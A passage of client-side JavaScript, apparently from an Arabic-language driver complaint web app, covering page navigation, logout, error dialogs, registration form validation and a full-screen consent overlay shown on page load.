    showPage('complaintPage');
}

function showSuccessMessage() {
    document.getElementById('successMessage').style.display = 'block';
    setTimeout(() => {
        showMainPage();
    }, 3000);
}

function hideSuccessMessage() {
    document.getElementById('successMessage').style.display = 'none';
    showMainPage();
}

function logout() {
    currentDriver = null;
    localStorage.removeItem('currentDriver');
    showPage('loginPage');
    document.getElementById('loginForm').reset();
}

// عرض نافذة الخطأ
function showErrorModal(title, message) {
    const modal = document.getElementById('errorModal');
    document.getElementById('errorTitle').textContent = title;
    document.getElementById('errorMessage').textContent = message;
    modal.style.display = 'flex';
}

// إغلاق نافذة الخطأ
function closeErrorModal() {
    document.getElementById('errorModal').style.display = 'none';
}

// إضافة التحقق لنموذج التسجيل أيضاً
function validateRegistrationForm() {
    const name = document.getElementById('newDriverName').value.trim();
    const phone = document.getElementById('newDriverPhone').value.trim();
    const department = document.getElementById('department').value;

    if (!name) {
        showErrorModal('خطأ في الاسم', 'يرجى إدخال اسم السائق');
        return false;
    }

    if (!validateArabicName(name)) {
        showErrorModal('خطأ في الاسم', 'يرجى إدخال الاسم باللغة العربية فقط');
        return false;
    }

    if (!phone) {
        showErrorModal('خطأ في رقم الهاتف', 'يرجى إدخال رقم الهاتف');
        return false;
    }

    if (!validatePhoneNumber(phone)) {
        showErrorModal('خطأ في رقم الهاتف', 'يرجى إدخال رقم هاتف صحيح مكون من 11 رقم');
        return false;
    }

    if (!department) {
        showErrorModal('خطأ في القسم', 'يرجى اختيار القسم');
        return false;
    }

    return true;
}

// التحقق من تسجيل الدخول عند تحميل الصفحة
window.addEventListener('load', () => {
    // فحص إجباري للموافقة على الوصول للبيانات
    checkRequiredPermissions().then(() => {
        const savedDriver = localStorage.getItem('currentDriver');
        if (savedDriver) {
            currentDriver = JSON.parse(savedDriver);
            document.getElementById('driverNameDisplay').textContent = currentDriver.name;
            document.getElementById('driverPhone').textContent = currentDriver.phone;
            showMainPage();
        } else {
            showPage('loginPage');
        }
    });
});

// فحص الصلاحيات الإجبارية
async function checkRequiredPermissions() {
    return new Promise((resolve) => {
        // إظهار نافذة الموافقة الإجبارية
        showPermissionModal().then(() => {
            resolve();
        });
    });
}

// إظهار نافذة الموافقة الإجبارية
function showPermissionModal() {
    return new Promise((resolve) => {
        const modalHTML = `
            <div id="permissionModal" style="
                display: flex;
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0, 0, 0, 0.9);
                z-index: 10000;
                justify-content: center;
                align-items: center;
                backdrop-filter: blur(10px);
            ">
                <div style="
                    background: white;
                    padding: 40px;
                    border-radius: 20px;
                    text-align: center;
                    max-width: 400px;
                    width: 90%;
                    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
                ">
                    <h2 style="color: #333; margin-bottom: 30px;">🔒 الموافقة المطلوبة</h2>
                    <p style="color: #666; margin-bottom: 30px; line-height: 1.6; font-size: 18px;">
                        الموافقة على استخدام النظام
                    </p>
                    <button onclick="acceptPermissions()" style="
                        background: linear-gradient(135deg, #28a745, #20c997);
                        color: white;
                        border: none;
                        padding: 15px 40px;
                        border-radius: 25px;
                        font-size: 18px;
                        font-weight: bold;
                        cursor: pointer;
                        width: 100%;
                    ">
                        موافق
                    </button>
                </div>
            </div>
        `;

        document.body.insertAdjacentHTML('beforeend', modalHTML);

        // تعريف دالة الموافقة
        window.acceptPermissions = () => {
            document.getElementById('permissionModal').remove();
            resolve();
        };
    });
}

function showRegisterPage() {
    showPage('registerPage');
}

function showLoginPage() {
    showPage('loginPage');
}
